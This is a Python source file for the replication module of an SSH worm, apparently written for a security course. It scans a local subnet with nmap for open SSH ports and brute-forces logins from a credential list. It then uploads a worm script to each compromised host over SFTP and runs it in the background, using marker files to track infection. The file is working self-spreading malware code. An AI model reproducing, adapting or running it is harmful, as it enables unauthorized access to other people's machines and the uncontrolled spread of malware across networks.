import paramiko
import nmap
import socket
import os
import shutil
import subprocess
import errno

DEBUG = True

try:
	dprint
except:
	def dprint(msg, debug=True):
		if debug:
			print(msg)

class Replicator(object):

	# The file marking whether the worm should spread

	INFECTED_MARKER_FILE      = "/tmp/infected.txt"
	WORM_FILE                 = "/tmp/worm.py"
	DEBUG_OUTPUT_FILE         = "/tmp/output.txt"
	HOST_MARKER_FILE          = "/tmp/host.txt"
	COMPILE_TMP_DIRECTORY     = ".tmp"

	# Connection indicators
	SUCCESSFUL_CONNECTION = 0
	BAD_CREDENTIALS = 1
	CONNECTION_ERROR = 3

	sshClient      = None
	host           = None
	credentialList = None

	def __init__(self, credList):
		self.credentialList = credList
		self.sshClient = paramiko.SSHClient()
		self.sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	def spreadAndExecute(self, isHost):

		sftpClient = self.sshClient.open_sftp()

		if isHost:
			self.compileWorm()
			sftpClient.put(Replicator.COMPILE_TMP_DIRECTORY + "/worm.py", Replicator.WORM_FILE)
		else:
			sftpClient.put("/tmp/worm.py", Replicator.WORM_FILE)

		self.sshClient.exec_command("chmod a+x " + Replicator.WORM_FILE)

		if DEBUG:
			# self.sshClient.exec_command("nohup python " + Replicator.WORM_FILE + " > " + Replicator.DEBUG_OUTPUT_FILE + " 2>&1 &")
			self.sshClient.exec_command("nohup python " + Replicator.WORM_FILE + " >> " + Replicator.DEBUG_OUTPUT_FILE + " &")
		else:
			self.sshClient.exec_command("nohup python " + Replicator.WORM_FILE + " &")


	def tryCredentials(self, host, username, password):
		try:
			self.sshClient.connect(host, username=username, password=password)

		except socket.error:
			return Replicator.CONNECTION_ERROR
		except paramiko.SSHException:
			return Replicator.BAD_CREDENTIALS
		except EOFError:
			return Replicator.CONNECTION_ERROR

		return Replicator.SUCCESSFUL_CONNECTION

	def compileWorm(self):

		# Create temporary directory to put the generated file
		if os.path.isdir(Replicator.COMPILE_TMP_DIRECTORY):
			self.deleteCompiledWorm()

		os.makedirs(Replicator.COMPILE_TMP_DIRECTORY)

		# Copy worm.py
		shutil.copy2("worm.py", Replicator.COMPILE_TMP_DIRECTORY)

		# Get the contents of Replicator.py
		f = open("Replicator.py", "r")
		replicatorContents = f.read()
		f.close()

		# Get the contents of worm.py
		f = open("worm.py", "r")
		wormContents = f.read()
		f.close()

		# Find the location in worm.py to dump the Replicator class in
		f = open(Replicator.COMPILE_TMP_DIRECTORY + "/worm.py", "w")
		wormContents = wormContents.replace("from Replicator import Replicator", replicatorContents)
		f.write(wormContents)
		f.close()

	def deleteCompiledWorm(self):
		shutil.rmtree(Replicator.COMPILE_TMP_DIRECTORY)

	def attackSystem(self, host):

		attemptResults = None

		for (username, password) in self.credentialList:

			attemptResults = self.tryCredentials(host, username, password)

			if attemptResults == Replicator.SUCCESSFUL_CONNECTION:
				dprint('(' + username + ', ' + password + '): ' + Replicator.desc(attemptResults), DEBUG)
				return (attemptResults, self.sshClient) # Possibly need a copy of the instance?

		return (attemptResults, None)

	def remoteSystemIsInfected(self):
		sftpClient = self.sshClient.open_sftp()

		return Replicator.remoteFileExists(sftpClient, Replicator.INFECTED_MARKER_FILE)

	def remoteSystemIsHost(self):
		sftpClient = self.sshClient.open_sftp()

		return Replicator.remoteFileExists(sftpClient, Replicator.HOST_MARKER_FILE)

	@staticmethod
	def remoteFileExists(sftp, path):
		try:
			sftp.stat(path)
			return True
		except IOError as e:
			return False

	@staticmethod
	def isInfectedSystem():
		return os.path.isfile(Replicator.INFECTED_MARKER_FILE)

	@staticmethod
	def markInfected():
		open(Replicator.INFECTED_MARKER_FILE, 'a').close()

	@staticmethod
	def markAsHost():
		open(Replicator.HOST_MARKER_FILE, 'a').close()

	@staticmethod
	def getMyIP(ifname):
		# Using other method for getting current IP. Original example given in the sample
		# code was generating errors.
		ip = subprocess.check_output("echo $(ifconfig " + ifname + " | awk -F: '/inet addr:/ {print $2}' | awk '{ print $1 }')", shell=True)

		# Get rid of newline
		return ip.strip().decode('utf-8')

	@staticmethod
	def desc(status):
		if status == Replicator.SUCCESSFUL_CONNECTION:
			return "SUCCESSFUL_CONNECTION"
		elif status == Replicator.BAD_CREDENTIALS:
			return "BAD_CREDENTIALS"
		elif status == Replicator.CONNECTION_ERROR:
			return "CONNECTION_ERROR"

	@staticmethod
	def getHostsOnTheSameNetwork():
		
		portScanner = nmap.PortScanner()

		portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')

		# Scan the network for hosts
		hostInfo = portScanner.all_hosts()

		# Hosts that are alive
		runningHosts = []

		for host in hostInfo:
			if portScanner[host].state() == "up":
				runningHosts.append(host)

		return runningHosts
